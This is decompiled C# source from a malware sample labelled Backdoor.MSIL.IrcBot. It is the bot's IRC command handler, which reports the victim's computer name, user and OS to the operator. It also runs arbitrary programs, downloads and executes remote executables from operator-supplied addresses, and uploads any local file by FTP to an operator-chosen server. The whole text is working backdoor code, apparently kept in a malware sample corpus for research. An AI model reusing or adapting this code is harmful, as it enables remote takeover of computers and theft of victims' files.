// Decompiled with JetBrains decompiler
// Type: AppClient.PacketHandler
// Assembly: AppClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 40D3B218-45AF-4713-B3C6-786D65AE1018
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.qe-710c3e02ba2956aa9af7f425e418218917e2c44f55f619222b605ff80f0dd9b9.exe

using AppClient.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net;

namespace AppClient
{
  [StandardModule]
  internal sealed class PacketHandler
  {
    private static string ParseName(string Info)
    {
      if (!Info.Contains("!"))
        return "Undefined";
      return Info.Split('!')[0].Substring(1);
    }

    public static void HandlePacket(string Packet)
    {
      string[] strArray = Packet.Split(" ".ToCharArray(), 4);
      string name = PacketHandler.ParseName(strArray[0]);
      if (Packet.StartsWith("PING"))
        Connexion.SendPacket("PONG" + Packet.Substring(4));
      if (Operators.CompareString(strArray[1], "001", false) == 0)
        PacketHandler.OnConnect();
      if (Operators.CompareString(strArray[1], "PRIVMSG", false) != 0)
        return;
      PacketHandler.OnMessage(name, strArray[0], strArray[2], strArray[3].Substring(1), !strArray[2].Contains("#"));
    }

    private static void OnConnect() => Connexion.SendPacket("JOIN " + Connexion.Canal);

    private static void OnMessage(
      string Name,
      string Host,
      string Canal,
      string Message,
      bool IsPrivate)
    {
      try
      {
        string lower = Message.Split(' ')[0].ToLower();
        string str1 = "PRIVMSG " + (IsPrivate ? Name : Canal) + " :";
        try
        {
          if (Operators.CompareString(lower, Commands.CmdComputer, false) == 0)
            Connexion.SendPacket(str1 + "Name : " + MyProject.Computer.Name + " ; User : " + Environment.UserName + " ; OS : " + MyProject.Computer.Info.OSFullName);
          if (Operators.CompareString(lower, Commands.CmdStart, false) == 0)
          {
            string PathName = Message.Split(" ".ToCharArray(), 2)[1];
            Interaction.Shell(PathName, AppWinStyle.NormalFocus);
            Connexion.SendPacket(str1 + "File '" + PathName + "' started successfully");
          }
          if (Operators.CompareString(lower, Commands.CmdStartDwl, false) == 0)
          {
            string address = Message.Split(" ".ToCharArray(), 2)[1];
            string str2 = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + Connexion.RandomString() + ".exe";
            Connexion.SendPacket(str1 + "Downloading file '" + address + "'");
            MyProject.Computer.Network.DownloadFile(address, str2);
            Connexion.SendPacket(str1 + "Running downloaded file '" + str2 + "'");
            Interaction.Shell(str2);
          }
          if (Operators.CompareString(lower, Commands.CmdDwl, false) == 0)
          {
            string address = Message.Split(" ".ToCharArray(), 2)[1];
            string destinationFileName = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + Connexion.RandomString() + ".exe";
            Connexion.SendPacket(str1 + "Downloading file '" + address + "'");
            MyProject.Computer.Network.DownloadFile(address, destinationFileName);
            Connexion.SendPacket(str1 + "File '" + destinationFileName + "' downloaded.");
          }
          if (Operators.CompareString(lower, Commands.CmdUpload, false) != 0)
            return;
          string[] strArray = Message.Split(" ".ToCharArray(), 5);
          Connexion.SendPacket(str1 + "Uploading file '" + strArray[4] + "' to " + strArray[1]);
          FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(strArray[1]);
          ftpWebRequest.Proxy = (IWebProxy) null;
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(strArray[2], strArray[3]);
          ftpWebRequest.Method = "STOR";
          byte[] buffer = System.IO.File.ReadAllBytes(strArray[4]);
          Stream requestStream = ftpWebRequest.GetRequestStream();
          requestStream.Write(buffer, 0, buffer.Length);
          requestStream.Close();
          requestStream.Dispose();
          Connexion.SendPacket(str1 + "File '" + strArray[4] + "' successfully uploaded to " + strArray[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          Connexion.SendPacket(str1 + "ERROR: " + exception.Message);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
